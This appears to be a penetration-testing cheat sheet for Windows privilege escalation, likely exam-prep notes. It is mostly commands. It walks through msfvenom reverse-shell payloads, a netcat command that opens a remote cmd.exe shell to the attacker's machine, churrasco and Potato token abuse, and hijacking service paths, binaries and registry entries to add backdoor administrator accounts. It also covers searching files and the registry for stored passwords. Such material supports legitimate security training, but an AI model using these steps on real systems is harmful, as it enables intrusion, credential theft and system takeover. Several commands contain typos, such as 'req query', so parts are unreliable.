- [Get information about Windows machine](#Get-information-about-Windows-machine)
  - [Basic enumeration](#Basic-enumeration)

- [Windows kernel exploits](#Windows-kernel-exploits)
  - [Windows kernel exploits resources](#Windows-kernel-exploits-resources)

- [Unquoted service paths](#Unquoted-service-paths)
  - [Check binary path name](#Check-binary-path-name)
  - [Unquoted service paths exploitaion example one](#Unquoted-service-paths-case-study-one)

- [Weak permissions](#weak-permissions)
  - [Folder weak permissions](#Folder-weak-permissions)
  - [Check folder permissions](#Check-folder-permissions)
  - [Folder permissions exploitation](#Folder-permissions-exploitation)
  - [Services permissions](#Services-permissions)
  - [Registers permissions](#Registers-permissions)

- [Token Kidnapping (churrasco)](#Token-Kidnapping)
  - [Token Kidnapping Description](Token-Kidnapping-Description)
  - [Token kidnapping case study one](#Token-kidnapping-case-study-one)

- [Token impersonation](#Token-impersonation)
  - [Token impersonation description](#Token-impersonation-description)
  - [Token impersonation exploitation](Token-impersonation-exploitation)

- [Antivirus and firewall](#Antivirus-and-firewall)
  - [Check windows defender status](#Check-windows-defender-status)
  - [Check all services status](#Check-all-services-status)
  - [Check firewall status](#Check-firewall-status)

- [Metasploit](#Metasploit)
  - [Local Exploit Suggester](#Local-exploit-suggester)

- [Hardcoded passwords](#Hardcoded-passwords)
  - [Search for password](#Search-for-password)
  - [Search passwords in config files](#Search-passwords-in-config-files)
  - [Search password in all files](#Search-password-in-all-files)
  - [Search password in registers](#Search-password-in-registers)

- [dll Hijacking](#dll-hijacking)

- [Hot Potato/Rotten Patato](#Hot-Potato)
  - [Authenticated_user_hot_potato](#Authenticated-user-hot-potato)
  - [Hot Potato via powershell](#Hot-Potato-via-powershell)
  
- [Alternate Data Streams](#Alternate-data-streams)

- [Impersonation Privileges](#Impersonation-Privileges)
  - [Impersonation Privileges basic](#Impersonation-Privileges-basic)
  - [Usefull resources](#Usefull-resources)
  
- [Registers overview](#Registers-overview)
  - [Regsvc esclation](#Regsvc-esclation)
 
- [Service Escalation executeable file](#Service-escalation-executeable-file)

- [Running powerup for privesc](#Running-powerUp-for-privesc)

- [Autorun privesc](#Autorun-privesc)

- [Check user instaled programs](#Check-user-installed-programs)
  - [User installed programs](#User-installed-program)

- [Tools](#Tools)
--------------------------------------------------------------------------------------------------------------------------------------
# Get information about Windows machine

## Basic enumeration

- Info about host
```
hostname

systeminfo

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

- user info
```
whoami

whoami /priv

whoami /groups

net users

net user <user_name>

net localgroup

net localgroup administrators
```

- network interfaces and routing table
```
ipconfig /all

route print

arp -A
```

- network connections and the firewall rules
```
netsh firewall show state

netsh firewall show config
```

- scheduled tasks, running processes, started services and installed drivers.
```
schtasks /query /fo LIST /v

tasklist /SVC

net start
```

- internal services
```
netstat -ano
```

- Windows managment instrumentation (check patch)
``` 
wmic qfe

wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Windows managment instrumentation (check logical disk)
```
wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

-----------------------------------------------------------------------------------------------------------------------------------

# Windows kernel exploits

## Windows kernel exploits resources
- https://github.com/SecWiki/windows-kernel-exploits

--------------------------------------------------------------------------------------------------------------------------------------

# Unquoted service paths

When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.

So, if we want to exploit this misconfiguration, three conditions have to be met:
- The service path is unquoted;
- The service path contains space; and
- We have write permission in one of the intermediate folders.

## Check binary path name
```
sc qc unquotedsvc

example output:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
For binPath C:\Program Files\Unquoted Path Service\Common Files\service.exe

Windows will search in this order:
- C:\Program.exe
- C:\Program Files\Unquoted.exe
- C:\Program Files\Unquoted Path.exe
- C:\Program Files\Unquoted Path Service\Common.exe
- C:\Program Files\Unquoted Path Service\Common Files\service.exe

## Unquoted service paths case study one
- Create payload
```
msfvenom -p Windows/shell_reverse_tcp lhost=<your_kali_machine> lport=<your_port> -f exe -o common.exe
```
- Store payload in the:
```
C:\Program Files\Unquoted Path Service\common.exe
```
- Setting up listener with metaspoloit
```
use multi/handler
```
- set options
- exploit
- Execute the payload by starting the service:
```
sc start unquotedsvc
```
--------------------------------------------------------------------------------------------------------------------------------------

# Weak permissions

## Folder weak permissions
If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

### Check folder permissions
```
TO DO
```

### Folder permissions exploitation
```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```
## service

--------------------------------------------------------------------------------------------------------------------------------------

# Token Kidnapping

##  Token Kidnapping Description

Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes. Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled.

- check user
```
whoami /all

are you nt authority\network service?
```

- Check SeImpersonatePrivilege privilege is enabled?
```
whoami /priv
```

- Upload churrasco.exe
```
https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```

- Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

- Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

- Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine
```

- churrasco.exe -d "C:\revshell\exe\path\"

- run netcat listener on kali machine
```
nc -lnvp xyz
```

## Token kidnapping case study one
- on Windows machine create c:\temp folder
- on linux machine run smb server:
```
python smbserver share smb
```
-move churrasco.exe to smb folder
-on windows machine
```
copy \\<kali_ip>\share\churrasco.exe
```
- create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o rs.exe
```
send rs.exe via smb and run:
```
churrasco.exe -d "C:\temp\rs.exe"
```
-----------------------------------------------------------------------------------------------------------------------------------
# Token impersonation

## Token impersonation description
- Tokens are temporary keys allow you access to a system/network without having to provide credentials each time you access the file.
 There are two types of token:
 
 Delegate: create for logging into a machine or using Remote Desktop
 Impersonate: attaching a network drive or a domain logon script
 
 ## Token impersonation exploitation
 - meterpreter
 ```
getuid
 
load incognito
 
list_tokens -u
 
  - Check for available tokens - 
  
impersonate_token example\\token
 
shell
```
- Check whoami
```
whoami
```
-----------------------------------------------------------------------------------------------------------------------------------
# Antivirus
 
## Check windows defender status
```
sc query windefend
```

## Check all services status
```
sc queryex type= service
```

## Check firewall status
```
netsh advfirewall firewall dump
```

```
netsh firewall show state
```

```
netsh firewall show config
```
--------------------------------------------------------------------------------------------------------------------------------------

# Metasploit

## Local Exploit Suggester
```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> run
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
--------------------------------------------------------------------------------------------------------------------------------------

# Hardcoded passwords

## Search for password
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.ini *.txt **config
```

## Search passwords in config files
```
dir /s *pass* == *cred* == *vnc* == *config*
```

## Search password in all files
```
findstr /spin "password" *.*
```

## Search password in common config file
```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
## Search password in registers
- VNC
```
  req query "HKCU\SOFTWARE\ORL\WinVNC3\Password"
```

- Windows autologin
```  
  req query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

- SNMP Parameters
```  
  req query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

- Putty
```
  req query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

- Other
```
  req query HKLM /f password /t REG_SZ /s

  req query HKCU /f password /t REG_SZ /s
```
-------------------------------------------------------------------------------------------------------------------------------------------------------

# dll Hijacking

## Description
When windows operation system run service or application look's for dll's and if dll does not exist we can set malicious dll. We have to check the path is writeable and dll does not exists.

## Run process monitor
- Add filter conditions
'''
Result is NAME NOT FOUND then
Path ends with .dll then Include
'''

- Run dll process from command line
```
sc start dllsvc
```

- Stop dll process from command line
```
sc stop dllsvc
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------

# Hot Potato
Technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command  as SYSTEM.
https://foxglovesecurity.com/2016/01/16/hot-potato/

#### Important
Attack can only be done if attackers current account has the privilage to impresonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

## Authenticated user hot potato
- https://github.com/foxglovesec/Potato
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Potato.exe -ip [IP] -cmd "C:\\Windows\\System32\\cmd.exe -K net localgroup administrator [username] /ADD" -disable_exhaust true -disable _defender true

## Hot Potato via powershell

- https://github.com/Kevin-Robertson/Tater

## Juicy potato
- https://github.com/ohpe/juicy-potato

--------------------------------------------------------------------------------------------------------------------------------------
# Alternate data streams
Alternate Data Streams (ADS) are a file attribute only found on the NTFS file system. It is a way to hide some information in file.
- check file for ADS
```
dir /R

example
more < hm.txt:root.txt:$DATA
```
# Runas
- Syntax
```
cmdkey /list
```
--------------------------------------------------------------------------------------------------------------------------------------
# Impersonation Privileges

## Impersonation Privileges basic
- execute command on command line:
```
whoami /priv

[...]
SeImpersonatePrivilege Enable
[...]
```
- execute command on meterpreter:
```
meterpreter> getprivs

[...]
SeImpersonatePrivilege Enable
[...]
```
## Usefull resources
- https://github.com/gtworek/Priv2Admin

--------------------------------------------------------------------------------------------------------------------------------------
# Registers Overview

## Regsvc esclation
```
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Check if output suggest that user belong to "NT AUTORITORY \INTERACTIVE" has fullcontrol permission over the registers key
```
NT AUTORITORY \INTERACTIVE Allow FullControl
```
- In case we have full control over register key, we can compile maliicious file. Copy C:\Users\User\Desktop\Tools\Source\windows_service.c to your kali machine.

- Connecto ftp server in C:\Users\User\Desktop\Tools\Source\ directory
```
ftp <kali_linux_ip>
put windows_service.c
```

- Modify method int Run() in windows_service.c file
```
change whoami command to:
cmd.exe /k net localgroup administrators user /add

!!! Change user to your user-name !!!!
```

- Compile C file
```
w64-ming32-gcc windows_service.c -o x.exe
```

- Place x.exe file in C:\Temp

- In Windows command prompt 
```
req add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\tmp\x.exe /f
```
- start regsvc
```
sc start regsvc
```

- confirm that user was add to the local admin group
```
net localgroup administrators
```
--------------------------------------------------------------------------------------------------------------------------------------
# Service Escalation executeable file
- Open command prompt and type
```
C:\Users\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
Everyone user group has "FILE_ALL_ACCESS" permission on the filepermservice.exe file

- 
--------------------------------------------------------------------------------------------------------------------------------------
# Autorun privesc

## Preparation
- In command prompt type:
```
C:\User\User\Desktop\Tools\Autoruns\Autoruns64.exe
```
- Use accesschk
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
- Check RW writes

## Exploitation
- msfconsole
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <your_ip>
run
```
- Create malicious file
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<your_ip> -f exe -o program.exe
```
- Copy program.exe to windows machine
- Place program.exe in 
````
C:\Program Files\Autorun Program
```

--------------------------------------------------------------------------------------------------------------------------------------



--------------------------------------------------------------------------------------------------------------------------------------
# Running powerUp for privesc
- Go to folder where powerUp.p1 is

- Turn off execution policy
```
powershell -ep bypass 
```

- Run powerUp.p1
```
Invoke-AllChecks
```
---------------------------------------------------------------------------------------------------------------------------------------
# Check user installed programs

## User installed programs
(run in powershell)
```
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
```


---------------------------------------------------------------------------------------------------------------------------------------
# Tools

- PowerShell

  - Sherlock
    - https://github.com/sherlock-project/sherlock
  - PowerUp
    - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
  - jaws-enum
    - https://github.com/411Hall/JAWS

- Executables
  - winPEAS
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
  - Seatbelt
    - https://github.com/GhostPack/Seatbelt
  - Watson
    - https://github.com/rasta-mouse/Watson
  - SharpUp
    - https://github.com/GhostPack/SharpUp
  
- Others
  - exploit suggester (metasploit)
    - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
  - exploit suggester (local)
    - https://github.com/mzet-/linux-exploit-suggester
